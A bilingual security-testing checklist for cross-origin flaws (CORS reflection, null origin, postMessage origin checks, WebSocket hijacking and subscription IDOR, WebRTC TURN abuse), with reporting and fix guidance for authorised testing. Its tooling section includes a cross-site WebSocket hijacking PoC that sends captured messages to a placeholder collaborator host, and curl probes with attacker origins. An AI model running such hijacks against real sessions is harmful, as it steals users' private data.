---
id: clk-cors-postmessage-websocket
title: CORS / postMessage / WebSocket / WebRTC
owasp_anchor: [WSTG-CLNT, API4:2023]
cwe: [CWE-346, CWE-942, CWE-829]
severity_typical: P2-P3
playbook: playbooks/cross_origin.yaml
last_updated: 2026-05-14
sources: []
maturity: stable
---

# CORS / postMessage / WebSocket / WebRTC Checklist

> 双语 / Bilingual：跨 origin 通信信道族。覆盖 CORS 头解析错误、postMessage origin 验证缺失、WebSocket 握手鉴权与订阅 IDOR、WebRTC TURN 滥用。
> 用法：先做"跨 origin 表面发现"，再分别走 CORS（HTTP 层）、postMessage（DOM 层）、WebSocket（持久连接）、WebRTC（媒体面）。
> Authorization-only：所有 PoC 用自己注册的两个账号；任何窃取数据的演示都将数据外发到自有 collaborator。

---

## 1. Recon & 跨 origin 表面发现

- [ ] 抓所有响应头：`Access-Control-Allow-Origin` / `-Credentials` / `-Methods` / `-Headers` / `Vary: Origin`
- [ ] 列出 `iframe` / `window.open` / `postMessage` 调用点（搜 bundle）
- [ ] 列出 `new WebSocket(...)` / `socket.io` / `signalR` / `centrifugo` 端点
- [ ] 列出 WebRTC：`RTCPeerConnection` / TURN/STUN 配置 / signaling endpoint
- [ ] 标记 sandbox iframe / `allow=` / COOP / COEP / CORP 头
- [ ] 抓 `Sec-Fetch-Site` / `Sec-Fetch-Mode` / `Origin`，看后端是否真依赖

## 2. CORS 策略错误

### 2.1 Origin reflect 类
- [ ] 发任意 `Origin: https://attacker.example` → 响应 `ACAO: https://attacker.example` 且 `ACAC: true`
- [ ] 测带 cookie：`fetch(url, {credentials:'include'})` 拿到响应
- [ ] substring/前后缀漏判：`Origin: https://app.evil.com`、`https://target.com.attacker.com`、点号未转义 `appXevil.com`

### 2.2 null Origin 类
- [ ] `Origin: null` 是否被反射并允许 credentials
- [ ] 利用方式：sandboxed iframe（`<iframe sandbox srcdoc>` 触发 null origin）发起 fetch
- [ ] data: URL / file:// 触发 null origin

### 2.3 wildcard with credentials 类
- [ ] `Access-Control-Allow-Origin: *` 同时 `Access-Control-Allow-Credentials: true` → 浏览器会拒绝，但若服务端动态拼接 `*` + cookie 反射的 token 仍泄露
- [ ] `Access-Control-Allow-Origin: *` 配合 `Authorization` header bearer：浏览器会发出预检，不带 cookie 但带 token

### 2.4 Preflight / 头白名单 / PNA
- [ ] `Access-Control-Allow-Headers: *` 被旧浏览器接受
- [ ] `Access-Control-Allow-Methods` 含危险方法（PUT/DELETE/PATCH）
- [ ] `Access-Control-Max-Age` 过长 → preflight 缓存策略变更滞后
- [ ] 静态资源 / 媒体响应是否 `ACAO: *`，间接泄露内部图片
- [ ] PNA：公网页面访问内网/`localhost` 是否走 `Access-Control-Request-Private-Network` 校验；COOP / COEP / CORP 是否到位

## 3. postMessage 缺陷

- [ ] 发送侧 `postMessage(data, '*')` 把敏感数据广播
- [ ] 接收侧 `addEventListener('message', e => ...)` 不校验 `e.origin`
- [ ] 接收侧只校验子串：`indexOf('app.com')` / `endsWith('app.com')` 都可绕过
- [ ] 接收侧把 `e.data` 直接喂 sink：`innerHTML` / `eval` / `Function` / `location = e.data.url`
- [ ] 接收侧把 `e.data` 当 routing 命令（"action": "navigate"）→ 攻击者诱导跳转 / 调用敏感 RPC
- [ ] iframe sandbox 缺 `allow-same-origin` 但仍接受外部 message → 内网域操控
- [ ] BroadcastChannel / SharedWorker 跨 tab 同源消息滥用；`e.source === window.parent` 是否被检查

## 4. WebSocket 缺陷

### 4.1 Handshake 鉴权
- [ ] WebSocket 握手是否仅依赖 cookie（无 CSRF token / Origin 校验）→ Cross-Site WebSocket Hijacking (CSWSH)
- [ ] 攻击页：`new WebSocket('wss://target/ws')` 在用户登录态下连上，对话直接走攻击者
- [ ] 服务端是否校验 `Origin` 头；很多 WS 服务端默认不校验
- [ ] `Sec-WebSocket-Protocol` 子协议鉴权是否被绕过（不带 token 也建连）

### 4.2 订阅 IDOR
- [ ] 建连后发 `{"action":"subscribe","channel":"user-<id>"}`：换 id 是否能订到他人 channel
- [ ] 房间号 / chatId / orderId 可枚举
- [ ] 推送中含敏感字段（PII / 内部 trace / 其他用户消息）
- [ ] 订阅后是否有二次鉴权（按消息 user_id 过滤）

### 4.3 帧级注入 / 协议 / 重放
- [ ] WebSocket message 直接拼到 SQL / 命令 / log（与传统 inj 同类）
- [ ] permessage-deflate 解压炸弹 / zip-bomb DoS
- [ ] socket.io 兼容长轮询时的 SSRF（早期版本 `&t=` 路径注入类）
- [ ] 重放任意旧帧是否被接受（缺乏 nonce / sequence）；reconnect 是否复用已撤销 token

## 5. WebRTC 缺陷

- [ ] TURN 凭据是否硬编码 / 长期有效 / 全用户共享 → 内网 TCP/UDP 端口扫描走 TURN relay
- [ ] STUN binding 中泄露 client 真实 IP
- [ ] DataChannel 不做二次鉴权，attacker peer 直接发任意 RPC 类消息
- [ ] Signaling endpoint（多用 WebSocket）复用 §4 的 IDOR / Origin 缺陷
- [ ] SDP 注入：把 SDP 字段拼到日志 / UI 时未转义
- [ ] mediaStream 滥用：自动接听 / 误启麦克风摄像头（与 permission policy 链）

## 6. 自动化辅助

```bash
# CORS 反射探针
for o in 'https://evil.example' 'null' 'https://attacker.target.com' 'https://target.com.evil.example'; do
  curl -sk -o /dev/null -w "Origin=$o => ACAO=%header{access-control-allow-origin} ACAC=%header{access-control-allow-credentials}\n" \
    -H "Origin: $o" "https://target/api/me"
done

# CORScanner
python3 cors_scan.py -u https://target/api/me

# WebSocket 测试：websocat（带任意 Origin）
websocat -H 'Origin: https://attacker.example' wss://target/ws

# CSWSH PoC 模板（保存为 attacker.html，外发到自有 collaborator）
cat > /tmp/cswsh.html <<'HTML'
<script>
const ws = new WebSocket("wss://target/ws");
ws.onmessage = e => fetch("https://collab.example/?d="+btoa(e.data));
ws.onopen = () => ws.send(JSON.stringify({action:"subscribe",channel:"user-self"}));
</script>
HTML

# postMessage fuzz：DOM Invader（Burp 内置）开启 postMessage tracker
# Caido HTTPQL：resp.header.name.eq("access-control-allow-origin") AND resp.header.value.cont("evil")

# Nuclei
nuclei -tags cors,websocket,postmessage -u https://target

# WebRTC TURN 凭据测试
turnutils_uclient -t -u <user> -w <pass> -p 3478 turn.target.example
```

## 7. Reporting Angle

* **Title 模板**：`<CORS|postMessage|WebSocket|WebRTC> <flaw> on <endpoint> allows <attacker role> to <impact>`
* **CVSS 3.1 区间**：
  * CORS 反射 + credentials → 读取私有 API：7.4 – 8.6（AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N）
  * CSWSH 全双工劫持：8.0 – 9.0
  * postMessage XSS 链：6.1 – 8.1
  * WebSocket 订阅 IDOR：4.3 – 7.5（按数据敏感度）
  * TURN 凭据滥用 / 内网中继：5.3 – 7.5
* **VRT P-level**：CSWSH 全功能劫持 → P2；CORS 私有数据读取 → P3 上界；postMessage XSS → P3；TURN 滥用 → P4-P3
* **CWE 推荐**：
  * CORS / postMessage origin 缺校验 → CWE-346（Origin Validation Error）
  * CORS misconfiguration → CWE-942（Permissive Cross-domain Policy）
  * 跨域引入不可信资源（WebRTC / WS）→ CWE-829（Inclusion of Functionality from Untrusted Control Sphere）
* **PoC 必须**：
  - 两个测试账号 A/B；attacker 页 + 自有 collaborator 收外发数据
  - 完整 request/response 含 `Origin` 头与反射结果
  - 浏览器版本（CORS 行为随 Chrome 版本变化）
* **Suggested Fix**（≥2）：
  1. CORS：白名单严格 exact match，禁止反射；带 credentials 时禁止 `*`
  2. postMessage：发送侧明确 `targetOrigin`，接收侧严格 `e.origin === expected`
  3. WebSocket：握手时校验 `Origin` 头 + 单独 CSRF token；按消息再做权限校验
  4. WebRTC：TURN 凭据短期化（如 ephemeral REST credential, RFC 7635），DataChannel 二次鉴权

## 8. 已迁移技法（来自 KB）

- [[techniques/cors_origin_reflect|CORS Origin 反射]]
- [[techniques/cors_null_origin|null Origin 滥用]]
- [[techniques/postmessage_no_origin|postMessage 无 origin 校验]]
- [[techniques/cswsh|CSWSH]]
- [[techniques/ws_subscription_idor|WS 订阅 IDOR]]
- [[techniques/webrtc_turn_abuse|TURN 凭据滥用]]
